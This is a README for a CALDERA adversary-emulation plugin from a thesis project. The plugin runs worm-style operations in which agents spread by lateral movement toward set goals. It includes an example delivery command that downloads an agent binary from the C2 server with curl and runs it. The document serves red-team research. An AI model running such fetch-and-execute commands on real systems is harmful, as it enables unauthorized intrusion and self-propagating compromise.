# CALDERA plugin: WORM

A [CALDERA](https://github.com/mitre/caldera#planning-system) plugin to manage worm-operations and goals from a REST API and GUI.

This project is part of my thesis project at the [University of Pisa](https://www.di.unipi.it/en/), supervised by Professor [Fabrizio Baiardi](http://pages.di.unipi.it/tonelli/baiardi/).

All the material in this repository can be used freely, provided that the author (me) and the [University of Pisa](https://www.di.unipi.it/en/) are properly cited.

## Requirements and quick start

1) To work properly, this plugin needs some extra features with respect to the [basic CALDERA version](https://github.com/mitre/caldera#planning-system).
You can download the version with the features required by this [branch](https://github.com/EmilioPanti/caldera/tree/EmilioPanti-FatherAgent-1).
The two versions differs because of an extra property of the agents: the <b>father</b>.

2) Download this plugin and insert it into CALDERA plugins folder.

3) Make sure you have inserted the WORM plugin in the CALDERA conf/local.yml configuration file:
```
plugins:
  - worm
```

NOTE: If you are interested in using this plugin for the <b>stable version 2.3.2</b> of CALDERA, download the version of the WORM plugin compatible with it from this [branch](https://github.com/EmilioPanti/worm/tree/caldera-v2.3.2).

## Functionality

This plugin introduces the following features:
* a new type of operation: <b>worm-operation</b>
* a new class of planners: <b>worm-planners</b>
* a new concept: <b>goal</b> 
* a new report for worm-operations
* easily separating the agents which - by participating in an worm-operation - have satisfied the goal by those which have not satisfied it

It is possible to use these features both via REST API and GUI.

## WHY this plugin

Using "normal" CALDERA operations with adversary profiles that perform <b>lateral movements</b>, some <b>inconsistent or unwanted scenarios</b> can occur. Examples:
* new agents created after a lateral movement operation could perform the attack phases in an unexpected order - due to the forced recovery of the phases already executed (by the "old" agents) as if they were a single phase.
* after the creation of new agents, some abilities of phases already executed could be repeated - due to new facts collected by the new agents and by the new potential links that can be generated starting from them.
* new agents created during the last phase never start the operation.
* new agents created during the last but one phase phase may not execute certain abilities - in particular those that use variables that can only be filled with host-facts (the facts with property major component = host), that the previous abilities have collected.

<br>

These problems are due to two implementation choices:
1) the operations are mainly driven by the execution phase and then by the agents
2) for each agent, the links of all the phases up to now executed are generated -- not just the current one
```
for each phase {
  for each agent {
   generates all possible links from phase 1 to the current phase
  }
}
```

<br>

Solution to the problems mentioned above:
1) new type of operation with a different logic --> <b>worm-operation</b>
2) new class of planners that generate links only for the current phase of the attack --> <b>worm-planners</b>

## WORM-OPERATION

I describe this operation in terms of the differences with respect a normal CALDERA operation:
1) <b>the basic logic</b>: in this type of operation the agents execute the attack <b>independently</b> of each other - e.g. agent X can be in phase 1 while agent Y is in phase 4. The independence between agents also makes the execution of the entire attack - and the expansion in case of lateral movements - faster.
2) <b>agent-map</b>: the GUI can build a view of the 'agents family tree' and any 'orphan agents'.
3) <b>goal</b>: it is possible to define a goal for the attack that we perform (more details in the goal section).
4) <b>goal-policy</b>: if a goal is set, it is possible either to stop an agent when a goal-agent is reached or to continue the attack as long as it possible.
5) <b>termination</b>: a worm-operation ends for one of three reasons: all agents performed the entire attack, or the user manually stops the operation, or a goal-agent is reached and the user has chosen to stop as soon as one goal-agent is reached.

Furthermore:
  * if a worm-operation is stopped, it cannot be restarted - like the normal operation - but is considered completely terminated.
  * manual approval is not possible for worm-operations.
  
The two last features may change in the future.

![alt text](https://github.com/EmilioPanti/worm/blob/master/docs/img/worm1.png "worm-operation start menu")

### Note 1: don't be misled by the name worm-operation!

This new type of operation can be used for any type of adversary profile, even those that do not perform lateral movements!
It's just a different logical approach to executing an adversary profile.

![alt text](https://github.com/EmilioPanti/worm/blob/master/docs/img/worm2.png)

### Note 2: build the 'agents family tree'

To build the 'agents family tree' we need to add - in the abilites that performs lateral movements - the
<b>father parameter</b> to the delivery command for new agents. Example:
```
do curl -sk -X POST -H 'file:sandcat.go' -H 'platform:linux' #{server}/file/download > /tmp/sandcat-linux && chmod +x /tmp/sandcat-linux && /tmp/sandcat-linux -server #{server} -group #{group} -father #{paw};
```

![alt text](https://github.com/EmilioPanti/worm/blob/master/docs/img/worm3.png)

(Note: if the father parameter is used correctly there should never be an orphan agent)

## WORM-PLANNERS

As with normal CALDERA operations, custom planners can also be used for worm-operations. To do this, just insert the relevant .yml file in the data/planners folder.
Unlike planners for normal CALDERA operations - they only need to implement the execute function - the planners for worm operations has to implement the two following functions:
1) <b>create_links</b>: given a worm-operation and an agent, it generates all possible links for the next phase that the agent must execute.
2) <b>create_cleanup_links</b>: given a worm-operation and an agent, it generates the cleanup links for the phases executed by the agent.

### The worm_sequential planner

It's the default planner for worm-operations: like its counterpart to normal CALDERA operations, it orders the generated links according to their score in descending order.

## GOAL

Goals are formulas in <b>Conjunctive Normal Form (CNF)</b>: a conjunction of clauses, where the clauses are a disjunction of literals.

Every literal can be a condition:
* on agent's <b>properties</b>.<br>
* on <b>host-facts</b> (the facts with property major component = host) collected by an agent.

A goal is achieved if at least ONE condition is satisfied for ALL the clauses.

An agent that satisfies the goal is called <b>goal-agent</b>.

Since the host-facts depend on the abilities, an adversary's profile is associated with each goal.
Obviously distinct goals can be created for the same adversary profile.

It is possible to create goals either through the GUI or by loading the .yml file in the data/goals folder:

File .yml example:
```
id: 89da1673-184d-4509-a53a-e4a3b4a06c2e
name: find-file
description: specific file in linux agents
adversary: 1a98b8e6-18ce-4617-8cc5-e65a1a9d490e
clauses:
  1:
  - {name: platform, type: property, value: linux}
  2:
  - {name: host.file.sensitive, type: host-fact, value: /home/test.txt}
```

GUI example:

![alt text](https://github.com/EmilioPanti/worm/blob/master/docs/img/goal.png)

![alt text](https://github.com/EmilioPanti/worm/blob/master/docs/img/goal2.png "Add new literal")

## REPORT

Even for worm-operations it is possible to download (and view by GUI) the report that summarizes the execution. With respect to those of normal CALDERA operations, now reports include some additional information:
* <b>goal</b>: if set one, it shows the name and description
* <b>policy</b>: if the worm-operation had a goal, it shows the chosen policy - stop at the first goal-agents / expand until it is possible.
* <b>goal-agents</b>: percentage of goal-agents and list of their paw.

![alt text](https://github.com/EmilioPanti/worm/blob/master/docs/img/report.png)

## Additional features for AGENTS

After the end of a worm-operation, it is possible to see the list of the agents which participated and which of them are goal-agents.

It is also possible:
* compare the results of a finished worm-operation with other goals - associated with the same adversary profile executed.
* split easily the <b>goal-agents</b> from the <b>no-goal-agents</b> that participated in an worm-operation into distinct groups.

![alt text](https://github.com/EmilioPanti/worm/blob/master/docs/img/agent.png)
